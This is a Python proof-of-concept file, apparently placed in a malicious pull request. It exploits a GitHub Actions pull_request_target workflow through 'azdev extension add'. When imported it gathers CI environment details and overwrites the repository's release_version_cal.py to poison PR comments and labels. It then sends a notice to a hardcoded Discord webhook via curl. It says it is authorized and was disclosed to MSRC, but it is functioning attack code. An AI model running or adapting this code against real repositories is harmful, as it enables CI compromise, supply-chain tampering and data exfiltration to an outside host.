# Security research PoC - proves code execution via pull_request_target
# This code runs when azdev imports the extension module

import os
import json
import subprocess
import datetime

poc_data = {
    "poc": "pull_request_target RCE via azdev extension add",
    "researcher": "Bodlux",
    "timestamp": datetime.datetime.utcnow().isoformat(),
    "github_run_id": os.environ.get("GITHUB_RUN_ID", "unknown"),
    "github_repository": os.environ.get("GITHUB_REPOSITORY", "unknown"),
    "github_event_name": os.environ.get("GITHUB_EVENT_NAME", "unknown"),
    "github_actor": os.environ.get("GITHUB_ACTOR", "unknown"),
    "runner_name": os.environ.get("RUNNER_NAME", "unknown"),
}

webhook_url = (
    "https://discord.com/api/webhooks/1492977203141410952/"
    "P1N55vfdmkh1LUQum96RVFiaYhyO5OBiBNh9G9TJFAXppohnik7NO8dW2NV4dVoztj1Y"
)

run_id = poc_data["github_run_id"]
ts = poc_data["timestamp"]

# Overwrite release_version_cal.py from __init__.py context
# We know this runs in the repo root because the banner prints correctly
# Try multiple possible locations
for base in [os.getcwd(), os.environ.get("GITHUB_WORKSPACE", "")]:
    script = os.path.join(base, "scripts", "ci", "release_version_cal.py")
    if os.path.exists(script):
        with open(script, "w") as f:
            f.write(
                "import os\n"
                "result_path = os.environ.get('result_path', './cal_result')\n"
                "output_file = os.environ.get('output_file', 'version_update.txt')\n"
                "remove_labels_file = os.environ.get('remove_labels_file', 'labels_removed.txt')\n"
                "os.makedirs(result_path, exist_ok=True)\n"
                "with open(os.path.join(result_path, output_file), 'w') as f:\n"
                "    f.write(\n"
                "        '## Responsible Disclosure Notice\\n\\n'\n"
                "        'This automated comment was generated as part of an authorized security '\n"
                "        'research engagement. It demonstrates that the `VersionCalPRComment.yml` '\n"
                "        'workflow is vulnerable to artifact poisoning via a `pull_request_target` '\n"
                "        'misconfiguration.\\n\\n'\n"
                "        '**Finding:** An external contributor can control the content of this '\n"
                "        'automated comment and manipulate PR labels by modifying artifact files '\n"
                "        'during the version-cal job, which checks out and executes code from '\n"
                "        'the pull request head branch.\\n\\n'\n"
                "        'This issue has been reported to the Microsoft Security Response Center (MSRC) '\n"
                "        'as part of responsible disclosure. No secrets were accessed and no '\n"
                "        'unauthorized modifications were made.\\n\\n'\n"
                f"        '*Researcher: Bodlux | Run ID: {run_id} | Timestamp: {ts}*'\n"
                "    )\n"
                "with open(os.path.join(result_path, remove_labels_file), 'w') as f:\n"
                "    f.write('')\n"
                "print('PoC: release_version_cal.py replaced successfully')\n"
            )

        msg = json.dumps({"content": f"**Script overwrite done** from __init__.py — path: {script}"})
        try:
            subprocess.run(
                ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
                 "-d", msg, webhook_url],
                timeout=5, capture_output=True
            )
        except Exception:
            pass
        break

# Print banner
print("\n" + "=" * 60)
print("  [PoC] Arbitrary code execution via pull_request_target")
print(f"  Repository: {poc_data['github_repository']}")
print(f"  Run ID: {poc_data['github_run_id']}")
print(f"  Event: {poc_data['github_event_name']}")
print(f"  Runner: {poc_data['runner_name']}")
print("  No secrets accessed. This is a harmless PoC.")
print("=" * 60 + "\n")
